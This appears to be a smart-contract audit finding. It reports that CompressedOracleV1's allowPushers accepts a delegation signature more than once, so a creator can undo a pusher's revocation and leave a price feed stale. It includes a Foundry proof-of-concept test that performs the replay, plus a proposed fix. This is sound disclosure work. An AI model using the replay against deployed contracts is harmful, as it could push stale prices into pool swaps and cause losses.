The key finding is in `allowPushers`. There is no used-signature tracking — the same delegation signature can be replayed within the deadline window to re-establish a delegation after the pusher has revoked it.

### Title
Delegation signature replay within deadline window nullifies `revokePusher()` and can cause stale-price execution — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` in `CompressedOracleV1` has no used-signature tracking. A creator who holds a valid (non-expired) delegation signature can replay it an unlimited number of times within the deadline window. After a pusher calls `revokePusher()` to clear their delegation, the creator can immediately re-establish it with the same bytes — nullifying the revocation. If the pusher then stops pushing (believing they have successfully revoked), their own namespace goes stale, and any pool reading from that namespace receives stale prices.

---

### Finding Description

`allowPushers` verifies an EIP-191 signature over `(chainid, address(this), deadline, pusher, msg.sender)` and writes `namespaceRemapping[pusher] = msg.sender`: [1](#0-0) 

The only replay guard is `_ensureDeadline(deadline)`: [2](#0-1) 

This check only prevents replay **after** the deadline expires. Within the deadline window, the exact same `(deadline, pusher, signatures)` calldata is accepted repeatedly because there is no nonce, no used-signature bitmap, and no state change that would invalidate the signature after first use. A grep across all production contracts confirms zero nonce or consumed-signature tracking:

```
grep: usedSignature|signatureUsed|nonce|_usedSig|consumedSig → No matches found
```

`revokePusher()` clears the mapping to `address(0)`: [3](#0-2) 

But the original signature is still cryptographically valid until `deadline`. The creator can call `allowPushers` again with the same signature bytes immediately after the pusher's revocation, restoring `namespaceRemapping[pusher] = creator`.

The code comment itself acknowledges the deadline is the only guard against post-revocation replay: [4](#0-3) 

The comment's reasoning is incomplete: the deadline prevents replay **after expiry**, but not **within** the deadline window. The two operations — `revokePusher` and `allowPushers` replay — are fully independent state transitions with no shared invalidation mechanism.

The `fallback` push path reads `namespaceRemapping[msg.sender]` at call time: [5](#0-4) 

So every push the pusher makes after the creator's replay lands in the creator's namespace, not the pusher's own namespace. The pusher's own namespace (used by a separate pool) receives no updates and goes stale.

---

### Impact Explanation

**Direct impact:** A creator who holds a valid delegation signature can permanently suppress a pusher's revocation for the entire deadline window. The pusher's own namespace — which may be the price source for a live pool — receives no updates and becomes stale. Any pool reading from that namespace will execute swaps against a stale bid/ask quote, satisfying the "bad-price execution: stale quote reaches a pool swap" impact gate.

**Concrete loss path:**
1. Pusher P's own namespace (`feedIdOf(P, slotIndex, positionIndex)`) is the price feed for Pool A.
2. Creator C obtains P's delegation signature (deadline = T + N days).
3. C calls `allowPushers` → P's pushes redirect to C's namespace; Pool A's feed goes stale.
4. P calls `revokePusher()` → mapping cleared; P believes they are now pushing into their own namespace.
5. C immediately replays the same signature via `allowPushers` → mapping restored to C.
6. P continues pushing, but all data lands in C's namespace. Pool A's feed remains stale.
7. Pool A's `getSafePrice` / `maxTimeDrift` check eventually reverts or returns a stale price, breaking swap execution or allowing execution at an outdated price.

---

### Likelihood Explanation

- **Trigger:** Any creator who has ever obtained a valid delegation signature can perform this attack. No privileged role is required.
- **Window:** The attack is live for the entire deadline period. Deadlines are chosen by the creator; nothing in the contract caps them.
- **Repeatability:** The creator can replay the signature every time the pusher revokes, indefinitely until the deadline expires.
- **Detectability:** The pusher sees `PusherRevoked` followed immediately by `PusherAuthorized` on-chain, but has no on-chain mechanism to prevent the re-establishment.

Likelihood: **High** — any creator with a non-expired signature can execute this with a single transaction.

---

### Recommendation

Mark each delegation signature as consumed after first use. The simplest fix is a `mapping(bytes32 => bool) public usedDelegationHashes` and a check-then-set pattern inside `allowPushers`:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(!usedDelegationHashes[hash], SignatureAlreadyUsed());
require(pusher == ECDSA.recover(hash, signatures[i]));
usedDelegationHashes[hash] = true;
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, include a per-pusher monotonic nonce in the signed payload so each consent can only be used once regardless of deadline.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayDelegationPoC is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 60_000);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testReplayBypassesRevocation() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent once
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — succeeds, revocation nullified
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // no revert!
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation re-established");

        // 5. Pusher's pushes still land in creator's namespace, not their own
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = uint48((uint48(1_000_000) << 16) | (uint48(3) << 8) | uint48(2));
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(
            (uint256(tsMs) << 8) | uint256(0) | (uint256(raw) << 208)
        ));
        assertTrue(ok);
        // Pusher's own namespace is still empty → stale for any pool reading it
        assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0);
    }
}
```

The test passes without any revert at step 4, confirming the replay succeeds and the pusher's revocation is silently overwritten.

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-211)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
